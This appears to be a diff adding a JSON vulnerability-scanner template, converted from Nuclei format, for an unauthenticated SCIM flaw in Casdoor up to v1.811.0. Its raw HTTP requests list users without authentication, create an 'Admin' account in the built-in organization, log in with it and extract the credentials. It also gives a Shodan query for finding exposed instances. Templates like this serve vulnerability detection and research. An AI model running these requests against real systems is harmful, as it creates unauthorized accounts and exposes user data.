@@ -1,0 +1,261 @@
+{
+  "id": "casdoor-unauth-operations",
+  "name": "Casdoor \u003c\u003dv1.811.0 - Unauthenticated SCIM Operations",
+  "author": "iamnoooob,rootxharsh,pdresearch",
+  "severity": "CRITICAL",
+  "description": "Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.\n",
+  "tags": [
+    "casdoor",
+    "unauth",
+    "intrusive",
+    "misconfig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "html:\"Casdoor\""
+  },
+  "variables": {
+    "password": [
+      "{{randstr_1}}"
+    ],
+    "email": [
+      "{{username}}@oast.fun"
+    ],
+    "username": [
+      "{{randstr}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /scim/Users HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",\"Resources\", \"emails\")",
+            "contains(header,\"casdoor_session_id\") \u0026\u0026 status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /scim/Users HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/scim+json-H\n\n{\"active\":true,\"displayName\":\"Admin\",\"emails\":[{\"value\":\"{{email}}\"}],\"password\":\"{{password}}\",\"nickName\":\"{{username}}\",\"schemas\":[\"urn:ietf:params:scim:schemas:core:2.0:User\",\"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User\"],\"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User\":{\"organization\":\"built-in\"},\"userName\":\"{{username}}\",\"userType\":\"normal-user\"}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",username)",
+            "status_code \u003d\u003d 201"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_2",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /api/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain;charset\u003dUTF-8\n\n{\"application\":\"app-built-in\",\"organization\":\"built-in\",\"username\":\"{{username}}\",\"autoSignin\":true,\"password\":\"{{password}}\",\"signinMethod\":\"Password\",\"type\":\"login\"}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body,\"\\\"status\\\": \\\"ok\\\"\",\"data\",\"msg\",\"sub\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "casdoor-unauth-operations",
+    "info": {
+      "name": "Casdoor \u003c\u003dv1.811.0 - Unauthenticated SCIM Operations",
+      "author": "iamnoooob,rootxharsh,pdresearch",
+      "severity": "critical",
+      "description": "Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.\n",
+      "metadata": {
+        "max_request": 3,
+        "shodan_query": "html:\"Casdoor\""
+      },
+      "tags": "casdoor,unauth,intrusive,misconfig"
+    },
+    "variables": {
+      "username": "{{randstr}}",
+      "password": "{{randstr_1}}",
+      "email": "{{username}}@oast.fun"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /scim/Users HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",\"Resources\", \"emails\")",
+              "contains(header,\"casdoor_session_id\") \u0026\u0026 status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /scim/Users HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/scim+json-H\n\n{\"active\":true,\"displayName\":\"Admin\",\"emails\":[{\"value\":\"{{email}}\"}],\"password\":\"{{password}}\",\"nickName\":\"{{username}}\",\"schemas\":[\"urn:ietf:params:scim:schemas:core:2.0:User\",\"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User\"],\"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User\":{\"organization\":\"built-in\"},\"userName\":\"{{username}}\",\"userType\":\"normal-user\"}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",username)",
+              "status_code \u003d\u003d 201"
+            ],
+            "condition": "and"
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /api/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain;charset\u003dUTF-8\n\n{\"application\":\"app-built-in\",\"organization\":\"built-in\",\"username\":\"{{username}}\",\"autoSignin\":true,\"password\":\"{{password}}\",\"signinMethod\":\"Password\",\"type\":\"login\"}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body,\"\\\"status\\\": \\\"ok\\\"\",\"data\",\"msg\",\"sub\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "\"Username: \" + username",
+              "\"Password: \" + password"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
